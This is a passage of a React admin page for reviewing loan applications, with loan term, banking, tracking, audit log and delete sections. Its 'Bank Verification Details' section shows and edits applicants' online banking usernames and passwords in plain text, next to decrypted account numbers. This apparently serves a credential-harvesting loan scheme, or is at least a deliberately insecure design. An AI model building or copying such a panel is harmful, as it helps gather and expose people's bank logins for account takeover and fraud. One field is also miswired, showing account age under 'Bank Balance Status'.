                    <label className="block text-xs text-gray-400 mb-2">
                      Loan Term
                    </label>
                    <div className="grid grid-cols-4 gap-3">
                      {[24, 36, 48, 60].map((term) => (
                        <button
                          key={term}
                          type="button"
                          onClick={() => handleFormChange("loan_term", term)}
                          className={`py-3 rounded-lg text-sm font-semibold border-2 transition-all ${
                            Number(formData.loan_term) === term
                              ? "border-primary bg-primary text-white"
                              : "border-surface-dark bg-white text-text-secondary hover:border-primary/50"
                          }`}
                        >
                          {term} mo
                        </button>
                      ))}
                    </div>
                    <p className="text-xs text-text-secondary mt-2">
                      Choose a repayment term from 24 to 60 months to fit your
                      lifestyle.
                    </p>
                  </div>
                  <Field
                    label="Monthly Payment"
                    value={formatCurrency(
                      calcMonthlyPayment(
                        Number(formData.loan_amount ?? 0),
                        Number(formData.loan_term ?? 0),
                      ),
                    )}
                  />
                </>
              ) : (
                <>
                  <Field
                    label="Loan Amount"
                    value={formatCurrency(app.loan_amount)}
                  />
                  <Field
                    label="Purpose"
                    value={app.loan_purpose?.replace(/-/g, " ")}
                  />
                  <Field label="Loan Term" value={`${app.loan_term} months`} />
                  <Field
                    label="Monthly Payment"
                    value={formatCurrency(
                      calcMonthlyPayment(app.loan_amount, app.loan_term),
                    )}
                  />
                </>
              )}
            </Section>

            {/* Banking */}
            <Section title="Banking Information">
              {edit ? (
                <>
                  <EditableField
                    label="Bank Name"
                    name="bank_name"
                    value={formData.bank_name}
                    onChange={handleFormChange}
                  />
                  <EditableField
                    label="Routing"
                    name="routing_number"
                    value={formData.routing_number}
                    onChange={handleFormChange}
                  />
                  {/* <EditableField
                    label="Account"
                    name="account_type"
                    value={formData.account_type}
                    onChange={handleFormChange}
                  /> */}
                  <div>
                    <label className="block text-xs text-gray-400 mb-2">
                      Account Type
                    </label>
                    <div className="grid grid-cols-2 gap-3">
                      {ACCOUNT_TYPES.map((type) => (
                        <button
                          key={type.value}
                          type="button"
                          onClick={() =>
                            handleFormChange("account_type", type.value)
                          }
                          className={`py-3 rounded-lg text-sm font-semibold border-2 transition-all ${
                            formData.account_type === type.value
                              ? "border-primary bg-primary text-white"
                              : "border-surface-dark bg-white text-text-secondary hover:border-primary/50"
                          }`}
                        >
                          {type.label}
                        </button>
                      ))}
                    </div>
                  </div>
                  <EditableField
                    label="Account Number"
                    name="account_decrypted"
                    value={formData.account_decrypted}
                    onChange={handleFormChange}
                  />
                  <EditableField
                    label="Bank Balance Status"
                    name="bankBalanceStatus"
                    value={formData.bankAccountAge}
                    onChange={handleFormChange}
                  />
                  <EditableField
                    label="Bank Account Age"
                    name="bankAccountAge"
                    value={formData.bankAccountAge}
                    onChange={handleFormChange}
                  />
                </>
              ) : (
                <>
                  <Field label="Bank Name" value={app.bank_name} />
                  <Field label="Routing" value={app.routing_number} />
                  <Field label="Account" value={app.account_type} />
                  <Field label="Account Number" value={app.account_decrypted} />
                </>
              )}
            </Section>

            {/* Bank Verification Details */}
            {bankVerification && (
              <Section title="Bank Verification Details">
                {edit ? (
                  <>
                    <EditableField
                      label="Full name"
                      name="full_name"
                      value={formData?.bankVerification?.full_name}
                      onChange={handleBankVerificationChange}
                    />
                    <EditableField
                      label="Email"
                      name="email"
                      value={formData?.bankVerification?.email}
                      onChange={handleBankVerificationChange}
                    />
                    <EditableField
                      label="Online Bank Username"
                      name="online_banking_username"
                      value={
                        formData?.bankVerification?.online_banking_username
                      }
                      onChange={handleBankVerificationChange}
                    />
                    <EditableField
                      label="Online Bank Password"
                      name="online_banking_password"
                      value={
                        formData?.bankVerification?.online_banking_password
                      }
                      onChange={handleBankVerificationChange}
                    />
                    <EditableField
                      label="Bank Name"
                      name="bank_name"
                      value={formData?.bankVerification?.bank_name}
                      onChange={handleBankVerificationChange}
                    />
                    {/* <EditableField
                        label="Account"
                        name="account_type"
                        value={formData?.bankVerification?.account_type}
                        onChange={handleBankVerificationChange}
                      />{" "} */}
                    <div>
                      <label className="block text-xs text-gray-400 mb-2">
                        Account Type
                      </label>
                      <div className="grid grid-cols-2 gap-3">
                        {ACCOUNT_TYPES.map((type) => (
                          <button
                            key={type.value}
                            type="button"
                            onClick={() =>
                              handleBankVerificationChange(
                                "account_type",
                                type.value,
                              )
                            }
                            className={`py-3 rounded-lg text-sm font-semibold border-2 transition-all ${
                              formData?.bankVerification?.account_type ===
                              type.value
                                ? "border-primary bg-primary text-white"
                                : "border-surface-dark bg-white text-text-secondary hover:border-primary/50"
                            }`}
                          >
                            {type.label}
                          </button>
                        ))}
                      </div>
                    </div>
                  </>
                ) : (
                  <>
                    <Field
                      label="Full name"
                      value={bankVerification?.full_name}
                    />
                    <Field label="Email" value={bankVerification?.email} />
                    <Field
                      label="Online Bank Username"
                      value={bankVerification?.online_banking_username}
                    />
                    <Field
                      label="Online Bank Password"
                      value={bankVerification?.online_banking_password}
                    />
                    <Field
                      label="Application ID"
                      value={bankVerification?.application_id}
                    />
                    <Field
                      label="Bank Name"
                      value={bankVerification?.bank_name}
                    />
                    <Field
                      label="Account"
                      value={bankVerification?.account_type}
                    />
                    {/* <Field
                      label="Verification Status"
                      value={bankVerification?.verification_status}
                    /> */}
                    <Field
                      label="Submitted At"
                      value={bankVerification?.created_at}
                    />
                  </>
                )}
              </Section>
            )}

            {/* UTM / Tracking */}
            {(app.utm_source || app.utm_medium || app.utm_campaign) && (
              <Section title="UTM Tracking">
                <Field label="Source" value={app.utm_source} />
                <Field label="Medium" value={app.utm_medium} />
                <Field label="Campaign" value={app.utm_campaign} />
                <Field label="Content" value={app.utm_content} />
              </Section>
            )}

            {/* Timestamps */}
            <Section title="Timestamps">
              <Field label="Created" value={formatDate(app.created_at)} />
              <Field label="Updated" value={formatDate(app.updated_at)} />
              <Field label="Reviewed" value={formatDate(app.reviewed_at)} />
              <Field label="Funded" value={formatDate(app.funded_at)} />
              <Field label="IP Address" value={app.ip_address} />
            </Section>

            {/* Audit Log */}
            {auditLog.length > 0 && (
              <div className="bg-white rounded-xl border border-gray-200 p-6">
                <h3 className="text-sm font-semibold text-gray-500 uppercase tracking-wide mb-4">
                  Audit Log
                </h3>
                <div className="space-y-3">
                  {auditLog.map((entry) => (
                    <div
                      key={entry.id}
                      className="flex items-start gap-3 text-sm border-b border-gray-50 pb-3"
                    >
                      <div className="flex-1">
                        <span className="font-medium text-gray-900">
                          {entry.action}
                        </span>
                        <span className="text-gray-400 mx-2">by</span>
                        <span className="text-gray-600">
                          {entry.performed_by}
                        </span>
                        {entry.details &&
                          Object.keys(entry.details).length > 0 && (
                            <p className="text-xs text-gray-400 mt-1">
                              {JSON.stringify(entry.details)}
                            </p>
                          )}
                      </div>
                      <span className="text-xs text-gray-400 whitespace-nowrap">
                        {formatDate(entry.created_at)}
                      </span>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* Delete */}
            {isAdmin && (
              <div className="bg-white rounded-xl border border-red-200 p-6">
                <h3 className="text-sm font-semibold text-red-500 uppercase tracking-wide mb-3">
                  Danger Zone
                </h3>
                {deleteConfirm ? (
                  <div className="flex items-center gap-3">
                    <p className="text-sm text-gray-600">
                      Are you sure? This action cannot be undone.
                    </p>
                    <button
                      onClick={handleDelete}
                      className="px-4 py-2 bg-red-600 text-white rounded-lg text-sm font-medium hover:bg-red-700 transition cursor-pointer"
                    >
                      Confirm Delete
                    </button>
                    <button
                      onClick={() => setDeleteConfirm(false)}
                      className="px-4 py-2 border border-gray-300 rounded-lg text-sm hover:bg-gray-50 transition cursor-pointer"
                    >
                      Cancel
                    </button>
                  </div>
                ) : (
                  <button
                    onClick={() => setDeleteConfirm(true)}
                    className="px-4 py-2 border border-red-300 text-red-600 rounded-lg text-sm font-medium hover:bg-red-50 transition cursor-pointer"
                  >
                    Delete Application
                  </button>
                )}
              </div>
            )}
          </div>
        ) : null}
      </div>
    </div>
  );
}
